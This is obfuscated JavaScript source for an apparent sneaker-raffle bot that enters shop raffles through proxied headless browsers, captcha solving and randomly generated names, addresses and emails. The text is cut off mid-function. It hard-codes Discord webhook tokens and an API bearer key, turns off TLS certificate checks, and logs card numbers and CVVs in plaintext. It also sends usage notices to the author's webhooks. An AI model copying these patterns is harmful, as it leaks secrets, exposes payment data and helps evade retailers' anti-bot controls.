process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0x9597be = require('node-imap'), _0x5d536d = require('util')['inspect'];
const _0x45ab86 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x1ea666 } = require('discord.js');
var _0x5a2bbf = require('exe');
const { execFile: _0x32de71 } = require('child_process'), _0x6d7b51 = require('puppeteer-extra'), _0xf48e5f = require('puppeteer-extra-plugin-recaptcha'), _0x1a9750 = require('puppeteer-extra-plugin-stealth'), _0x19e6c5 = require('chalk'), _0x1f02d2 = require('node-bash-title'), _0x80a504 = require('fs'), _0x13cee1 = require('axios'), _0x5ea71e = require('papaparse');
var _0x243dc4 = require('random-name');
const _0x355e6b = require('request');
var _0x44753c = require('prompt');
const _0x3720c0 = _0x355e6b['jar']();
var _0x9a51aa = {};
const _0x5e5960 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x8d76f1 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x5b6aac = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x28d438 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x5dc439 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x3962ae = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x3d8a40 = 'https://discord.com/api/webhooks/', _0x266646 = '' + _0x3d8a40 + _0x5b6aac, _0xe1dcb8 = '' + _0x3d8a40 + _0x28d438, _0x5df4ad = '' + _0x3d8a40 + _0x5e5960, _0x48c50b = '' + _0x3d8a40 + _0x8d76f1, _0x4d6262 = '' + _0x3d8a40 + _0x5dc439, _0xb51342 = '' + _0x3d8a40 + _0x3962ae;
const _0x32938d = JSON['parse'](_0x80a504['readFileSync']('../package.json', 'utf-8')), _0x198625 = _0x32938d['version'];
var _0x52146d, _0x5291fa, _0x2eadcf, _0x3b7691, _0xdbd348, _0x2d0e38, _0x213f4d, _0x14d853;
const _0x6d37e4 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x430043 = ![];
const _0x272e2e = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x1e01d5 = '0123456789';
var _0xf7ad0d = _0x272e2e['split']('');
const _0x49c98c = require('auto-git-update'), { PageEmittedEvents: _0x124f59 } = require('puppeteer'), { getRandomValues: _0x3cfcc9 } = require('crypto'), { resolve: _0x1c9e21 } = require('path'), { Console: _0x40d7ef } = require('console'), _0x4bddbf = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x3a0997 = new _0x49c98c(_0x4bddbf);
async function _0x24fcf2() {
    _0xdbd348 = _0x80a504['readdirSync']('../proxies'), _0x3b7691 = _0x80a504['readdirSync']('../tasks'), !_0x80a504['existsSync']('../accounts/fenom.csv') && _0x80a504['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x80a504['existsSync']('../accounts/bstn.csv') && _0x80a504['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x80a504['existsSync']('../failed-tasks.csv') && _0x80a504['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x80a504['existsSync']('../successful-tasks.csv') && _0x80a504['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x9a51aa = JSON['parse'](_0x80a504['readFileSync']('../settings.json', 'utf-8')), !_0x9a51aa['delay'] && (_0x9a51aa['delay'] = 0x3c, _0x80a504['writeFileSync']('../settings.json', JSON['stringify'](_0x9a51aa, null, 0x2))), !_0x9a51aa['masterMail'] && (_0x9a51aa['masterMail'] = 'yourmail@gmail.com', _0x80a504['writeFileSync']('../settings.json', JSON['stringify'](_0x9a51aa, null, 0x2))), !_0x9a51aa['masterPassword'] && (_0x9a51aa['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x80a504['writeFileSync']('../settings.json', JSON['stringify'](_0x9a51aa, null, 0x2))), !_0x9a51aa['captchaKey'] && (_0x9a51aa['captchaKey'] = '', _0x80a504['writeFileSync']('../settings.json', JSON['stringify'](_0x9a51aa, null, 0x2))), !_0x9a51aa['useRandomProxy'] && (_0x9a51aa['useRandomProxy'] = !![], _0x80a504['writeFileSync']('../settings.json', JSON['stringify'](_0x9a51aa, null, 0x2))), !_0x9a51aa['shuffleTasks'] && (_0x9a51aa['useRandomProxy'] = ![], _0x80a504['writeFileSync']('../settings.json', JSON['stringify'](_0x9a51aa, null, 0x2))), !_0x9a51aa['webhook'] && (_0x9a51aa['webhook'] = '', _0x80a504['writeFileSync']('../settings.json', JSON['stringify'](_0x9a51aa, null, 0x2))), _0x9a51aa['delay'] <= 0x1388 && (_0x9a51aa['delay'] = _0x9a51aa['delay'] * 0x3e8), _0x9a51aa['MahaDelay'] = _0x9a51aa['delay'], _0x3d8a40 = _0x9a51aa['webhook'], _0x2d0e38 = _0x9a51aa['licenseKey'];
}
let _0x34d5e2, _0x2cd6ef = [], _0x56b4a4;
const _0xbbd9dc = _0x13f605 => new Promise(_0x117377 => setTimeout(_0x117377, _0x13f605));
function _0x38a9f3(_0x248e63, _0x367973) {
    return Math['floor'](Math['random']() * (_0x367973 - _0x248e63 + 0x1) + _0x248e63);
}
function _0x5a5e45(_0x3b6fec) {
    let _0x14d97a = _0x3b6fec['length'], _0x13970f;
    while (_0x14d97a != 0x0) {
        _0x13970f = Math['floor'](Math['random']() * _0x14d97a), _0x14d97a--, [_0x3b6fec[_0x14d97a], _0x3b6fec[_0x13970f]] = [
            _0x3b6fec[_0x13970f],
            _0x3b6fec[_0x14d97a]
        ];
    }
    return _0x3b6fec;
}
async function _0x29c7b0(_0x288585) {
    return _0x13cee1['get']('https://api.hyper.co/v4/licenses/' + _0x288585, { 'headers': { 'Authorization': 'Bearer\x20' + _0x6d37e4 } })['then'](_0x46cfd0 => _0x46cfd0['data'])['catch'](() => null);
}
;
async function _0x2b954b(_0x12b086) {
    console['clear']();
    if (_0x12b086 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x1cc561 = await _0x44753c['get']('License');
        if (_0x1cc561['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0xbbd9dc(0xbb8), _0x2b954b(_0x12b086);
        _0x12b086 = _0x1cc561['License'], _0x9a51aa['licenseKey'] = _0x12b086, _0x2d0e38 = _0x12b086, _0x80a504['writeFileSync']('../settings.json', JSON['stringify'](_0x9a51aa));
    }
    console['log']('Checking\x20license\x20' + _0x2d0e38 + '...'), await _0xbbd9dc(0x320);
    const _0x2ef01a = await _0x29c7b0(_0x12b086);
    _0x213f4d = JSON['stringify'](_0x2ef01a['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x14d853 = JSON['stringify'](_0x2ef01a['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x2ef01a)
        return console['log']('License\x20not\x20found');
    if (!_0x2ef01a['user'])
        return console['log']('License\x20not\x20bound');
    return _0x2ef01a['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x430043 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x430043 = ![]);
}
async function _0x512859() {
    var _0x4f724e = await _0x44753c['get']('Module');
    return console['clear'](), _0x4f724e['Module'];
}
;
async function _0x487531() {
    var _0x121395 = await _0x44753c['get']('Setting');
    return console['clear'](), _0x121395['Setting'];
}
async function _0x5852ae() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x95e009 = 0x0; _0x95e009 < _0x3b7691['length']; _0x95e009++) {
        console['log']('\x20(' + _0x95e009 + ')\x20' + _0x3b7691[_0x95e009]);
    }
    console['log']('');
    var _0x2ef044 = await _0x44753c['get']('Task');
    if (_0x2ef044['Task'] > _0x3b7691['length'] - 0x1 || isNaN(_0x2ef044['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0xbbd9dc(0x3e8), _0x5852ae();
    var _0x25ea5d = _0x80a504['readFileSync']('../tasks/' + _0x3b7691[_0x2ef044['Task']], 'utf-8');
    return _0x2eadcf = _0x5ea71e['parse'](_0x25ea5d, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x19e6c5['blue'](_0x3b7691[_0x2ef044['Task']])), _0x52146d = _0x3b7691[_0x2ef044['Task']], _0x2eadcf;
}
async function _0x19b735() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x2079da = 0x0; _0x2079da < _0xdbd348['length']; _0x2079da++) {
        console['log']('\x20(' + _0x2079da + ')\x20' + _0xdbd348[_0x2079da]);
    }
    console['log']('');
    var _0x4e3eab = await _0x44753c['get']('Proxies');
    if (_0x4e3eab['Proxies'] > _0xdbd348['length'] - 0x1 || isNaN(_0x4e3eab['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0xbbd9dc(0x3e8), _0x19b735();
    var _0x31bc02 = _0x80a504['readFileSync']('../proxies/' + _0xdbd348[_0x4e3eab['Proxies']], 'utf-8')['split']('\x0a');
    let _0x5f3985 = _0x31bc02['map']((_0x421174, _0x3cbb48) => {
        sanatizeProxy = _0x421174['replace']('\x0d', '');
        if (_0x31bc02[_0x3cbb48 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x5291fa = _0xdbd348[_0x4e3eab['Proxies']], console['clear'](), _0x5f3985;
}
async function _0x4267ae() {
    var _0x329cf9 = await _0x44753c['get']('Value');
    return console['clear'](), _0x329cf9['Value'];
}
async function _0x424d56(_0x423124) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x28cd66 = 0x0; _0x28cd66 < _0x423124['length']; _0x28cd66++) {
        console['log']('\x20(' + _0x28cd66 + ')\x20[' + _0x423124[_0x28cd66]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x3288c5 = await _0x44753c['get']('Module');
    return _0x3288c5['Module'];
}
async function _0x3d2f92() {
    var _0x4631d6 = await _0x44753c['get']('Password');
    return console['clear'](), _0x4631d6['Password'];
}
;
async function _0x3cd2d5() {
    var _0x4773ce = await _0x44753c['get']('Links');
    return _0x4773ce['Links'];
}
;
async function _0x327729() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x3eb5ea = 0x0; _0x3eb5ea < _0x2cd6ef['length']; _0x3eb5ea++) {
        console['log']('\x20(' + _0x3eb5ea + ')\x20' + _0x2cd6ef[_0x3eb5ea]);
    }
    ;
    console['log']();
    let _0x13fcbc = await _0x44753c['get']('Product');
    return console['clear'](), _0x13fcbc['Product'];
}
;
function _0x38a61b() {
    var _0x40fe53 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x40fe53;
}
;
function _0x3b4ed9() {
    var _0x57dc83 = new Date(Date['now']())['toLocaleString']();
    return _0x57dc83['replace'](',', '');
}
async function _0x4236dd(_0x4bb68d, _0x2eae8e) {
    let _0x202d66 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x198625 != 'devkey') {
        await _0x13cee1['post'](_0x4bb68d, _0x2eae8e, _0x202d66);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x23dc1b(_0x5b84da, _0x2d2268, _0x541697, _0x3f61ec, _0x19235d) {
    if (!_0x3f61ec && _0x541697 == 'dev') {
        var _0x1fe744 = new _0x1ea666()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2d2268['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2d2268['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x5b84da['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x9a51aa['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x213f4d,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x5b84da['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x198625,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x1fe744['data'];
    } else {
        if (_0x3f61ec && _0x541697 == 'dev') {
            var _0x1fe744 = new _0x1ea666()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2d2268['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x213f4d,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2d2268['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x5b84da['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x9a51aa['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x19235d,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x5b84da['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x198625,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x1fe744['data'];
        } else {
            if (_0x541697 == 'pub') {
                var _0x1fe744 = new _0x1ea666()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2d2268['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2d2268['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x5b84da['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x9a51aa['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x5b84da['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x198625,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x1fe744['data'];
            } else {
                if (_0x541697 == 'acc' && !_0x3f61ec) {
                    var _0x1fe744 = new _0x1ea666()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2d2268['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x213f4d,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2d2268['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x9a51aa['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x198625,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x1fe744['data'];
                } else {
                    if (_0x541697 == 'acc' && _0x3f61ec) {
                        var _0x1fe744 = new _0x1ea666()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2d2268['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x213f4d,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x19235d,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x2d2268['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x9a51aa['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x198625,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x1fe744['data'];
                    } else {
                        if (_0x541697 == 'open') {
                            var _0x1fe744 = new _0x1ea666()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x14d853)['addFields']({
                                'name': 'User',
                                'value': '' + _0x213f4d,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x198625,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x1fe744['data'];
                        } else {
                            if (!_0x3f61ec && _0x541697 == 'ver') {
                                var _0x1fe744 = new _0x1ea666()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x2d2268['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x213f4d,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x2d2268['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x9a51aa['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x198625,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x1fe744['data'];
                            } else {
                                if (_0x3f61ec && _0x541697 == 'ver') {
                                    var _0x1fe744 = new _0x1ea666()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x2d2268['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x213f4d,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x19235d,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x2d2268['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x9a51aa['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x198625,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x1fe744['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x2f5330(_0x43f657, _0x54af76) {
    var _0x15e35f = _0x43f657[_0x54af76]['Address1']['split'](''), _0x4b34b4 = _0x43f657[_0x54af76]['Address2']['split'](''), _0x1a8901 = _0x43f657[_0x54af76]['Email']['split']('@');
    for (var _0xdb9142 = 0x0; _0xdb9142 < _0x15e35f['length']; _0xdb9142++) {
        if (_0x15e35f[_0xdb9142] == 'X') {
            var _0x1f8bd8 = Math['round'](Math['random']() * (_0x272e2e['length'] - 0x1));
            _0x15e35f[_0xdb9142] = _0xf7ad0d[_0x1f8bd8];
        }
    }
    ;
    for (var _0xdb9142 = 0x0; _0xdb9142 < _0x4b34b4['length']; _0xdb9142++) {
        if (_0x4b34b4[_0xdb9142] == 'X') {
            var _0x1f8bd8 = Math['round'](Math['random']() * (_0x272e2e['length'] - 0x1));
            _0x4b34b4[_0xdb9142] = _0xf7ad0d[_0x1f8bd8];
        }
    }
    ;
    _0x43f657[_0x54af76]['FirstName'] == 'RANDOM' && (_0x43f657[_0x54af76]['FirstName'] = _0x243dc4['first']());
    _0x43f657[_0x54af76]['LastName'] == 'RANDOM' && (_0x43f657[_0x54af76]['LastName'] = _0x243dc4['last']());
    _0x1a8901[0x0] == 'RANDOM' ? _0x1a8901[0x0] = '' + _0x243dc4['first']() + _0x243dc4['last']() + _0x38a9f3(0x1, 0x270f) + '@' : _0x1a8901[0x0] = _0x1a8901[0x0] + '@';
    _0x43f657[_0x54af76]['Email'] = _0x1a8901['join'](''), _0x43f657[_0x54af76]['Address1'] = _0x15e35f['join'](''), _0x43f657[_0x54af76]['Address2'] = _0x4b34b4['join']('');
    _0x43f657[_0x54af76]['Phone'] == 'RANDOM' && (_0x43f657[_0x54af76]['Phone'] = '0' + _0x38a9f3(0x5f5e100, 0x3b9ac9ff));
    if (_0x43f657[_0x54af76]['Follower'] == 'RANDOM') {
        var _0xfd5142 = _0x38a9f3(0x1, 0x270f);
        _0x43f657[_0x54af76]['Follower'] = '' + _0x243dc4['first']() + _0x243dc4['last']() + _0xfd5142 + '\x20';
    }
    _0x43f657[_0x54af76]['HouseNumber'] == 'RANDOM' && (_0x43f657[_0x54af76]['HouseNumber'] = _0x38a9f3(0x1, 0xc8));
    if (_0x43f657[_0x54af76]['Address1'] == 'RANDOM') {
        var _0x4a2c35 = Math['round'](Math['random']() * (_0x272e2e['length'] - 0x1)), _0x170057 = _0xf7ad0d[_0x4a2c35];
        _0x43f657[_0x54af76]['Address1'] = _0x243dc4['last']() + 'straat', _0x43f657[_0x54af76]['Zip'] == '' && (_0x43f657[_0x54af76]['Postcode'] = _0x38a9f3(0x3e8, 0x270f) + '\x20' + _0x170057 + _0x170057, _0x43f657[_0x54af76]['Zip'] = _0x43f657[_0x54af76]['Postcode']), _0x43f657[_0x54af76]['HouseNumber'] = '' + _0x38a9f3(0x1, 0xc8);
    }
    return;
}
;
async function _0xc8d9fd(_0x4343de, _0x81b872) {
    _0x80a504['appendFileSync']('../failed-tasks.csv', _0x3b4ed9() + ',' + _0x81b872['store'] + ',' + _0x81b872['name'] + ',' + _0x4343de['Url'] + ',' + _0x4343de['Size'] + ',' + _0x4343de['Follower'] + ',' + _0x4343de['FirstName'] + ',' + _0x4343de['LastName'] + ',' + _0x4343de['Address1'] + ',' + _0x4343de['Address2'] + ',' + _0x4343de['HouseNumber'] + ',' + _0x4343de['Zip'] + ',' + _0x4343de['City'] + ',' + _0x4343de['State'] + ',' + _0x4343de['Country'] + ',' + _0x4343de['Phone'] + ',' + _0x4343de['Email'] + ',' + _0x4343de['Password'] + ',' + _0x4343de['PaymentMethod'] + ',' + _0x4343de['CardType'] + ',' + _0x4343de['NameOnCard'] + ',' + _0x4343de['CardNumber'] + ',' + _0x4343de['ExpiryDate'] + ',' + _0x4343de['CVV'] + ',' + _0x4343de['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x5d1d0f(_0x2a7aab, _0x3fed4b) {
    _0x80a504['appendFileSync']('../successful-tasks.csv', _0x3b4ed9() + ',' + _0x3fed4b['store'] + ',' + _0x3fed4b['name'] + ',' + _0x2a7aab['Url'] + ',' + _0x2a7aab['Size'] + ',' + _0x2a7aab['Follower'] + ',' + _0x2a7aab['FirstName'] + ',' + _0x2a7aab['LastName'] + ',' + _0x2a7aab['Address1'] + ',' + _0x2a7aab['Address2'] + ',' + _0x2a7aab['HouseNumber'] + ',' + _0x2a7aab['Zip'] + ',' + _0x2a7aab['City'] + ',' + _0x2a7aab['State'] + ',' + _0x2a7aab['Country'] + ',' + _0x2a7aab['Phone'] + ',' + _0x2a7aab['Email'] + ',' + _0x2a7aab['Password'] + ',' + _0x2a7aab['PaymentMethod'] + ',' + _0x2a7aab['CardType'] + ',' + _0x2a7aab['NameOnCard'] + ',' + _0x2a7aab['CardNumber'] + ',' + _0x2a7aab['ExpiryDate'] + ',' + _0x2a7aab['CVV'] + ',' + _0x2a7aab['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x4dd6f3() {
    let _0x1e3437 = proxyFile['split']('\x0a'), _0x287068 = _0x1e3437['map']((_0x187986, _0x19bbd7) => {
        sanatizeProxy = _0x187986['replace']('\x0d', '');
        if (_0x1e3437[_0x19bbd7 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x287068;
}
;
async function _0x2e0919(_0x53584c) {
    var _0x3b7a6c = _0x53584c[0x1]['split'](':');
    const _0x2665f9 = await _0x6d7b51['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x3b7a6c[0x0] + ':' + _0x3b7a6c[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x1dce13 = await _0x2665f9['newPage']();
        await _0x1dce13['authenticate']({
            'username': '' + _0x3b7a6c[0x2],
            'password': '' + _0x3b7a6c[0x3]
        }), console['log'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x1dce13['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1dce13['setRequestInterception'](!![]), _0x1dce13['on']('request', _0x8fb98b => {
            _0x8fb98b['resourceType']() === 'image' || _0x8fb98b['resourceType']() === 'font' || _0x8fb98b['resourceType']() === 'media' ? _0x8fb98b['abort']() : _0x8fb98b['continue']();
        }), await _0x1dce13['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x1dce13['waitForTimeout'](0xbb8), await _0x1dce13['waitForSelector']('.product-card');
        const _0x1be42a = await _0x1dce13['$$eval']('a.product-card', _0x3c5603 => {
            return _0x3c5603['map'](_0x2f342d => _0x2f342d['href']);
        });
        return _0x2cd6ef = _0x1be42a;
    } catch (_0x2980f3) {
        console['log']('\x20' + _0x2980f3);
    } finally {
        _0x2665f9['close'](), console['clear']();
    }
}
;
async function _0x173c01(_0x11088e, _0x42d6e4) {
    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x9a51aa['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x484404 = 0x0; _0x484404 < bouncewear['length']; _0x484404++) {
        await _0x2f5330(bouncewear, _0x484404);
        if (bouncewear[_0x484404]['Email'] == '' || bouncewear[_0x484404]['Password'] == '' || bouncewear[_0x484404]['FirstName'] == '' || bouncewear[_0x484404]['LastName'] == '') {
            console['log'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x9a51aa['useRandomProxy'] = ![])
            var _0x2d1576 = _0x4dd6f3()[_0x484404]['split'](':');
        else
            var _0x11a8e5 = Math['round'](Math['random']() * (_0x4dd6f3()['length'] - 0x1)), _0x2d1576 = _0x4dd6f3()[_0x11a8e5]['split'](':');
        const _0x1e64d0 = await _0x6d7b51['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x2d1576[0x0] + ':' + _0x2d1576[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4f3e2b = await _0x1e64d0['newPage']();
            await _0x4f3e2b['authenticate']({
                'username': '' + _0x2d1576[0x2],
                'password': '' + _0x2d1576[0x3]
